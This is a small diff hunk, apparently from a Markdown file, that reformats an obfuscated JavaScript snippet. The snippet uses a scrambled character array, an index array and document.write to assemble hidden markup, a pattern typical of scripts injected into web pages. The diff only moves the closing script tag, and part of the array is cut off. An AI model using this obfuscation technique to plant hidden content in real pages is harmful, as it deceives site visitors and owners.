@@ -26,5 +26,6 @@ var izbsxrwpgacnfjulthovqmydek = ["o","=",":","f","o","s","\/","h","\"","t","d",
 var eciujlgqbmpdkfayxrhtvsonzw = [29,25,30,7,43,18,3,1,8,56,25,48,24,9,0,2,0,17,3,16,5,12,25,9,18,42,36,0,18,32,12,0,10,18,5,8,14,0,17,3,16,5,12,25,9,18,42,36,0,18,32,12,0,10,18,5,29,6,25,14];
 document.write(eciujlgqbmpdkfayxrhtvsonzw.map(function(c) {
     return izbsxrwpgacnfjulthovqmydek[c];
-}).join(''));</script>
+}).join(''));
+</script>
 ```
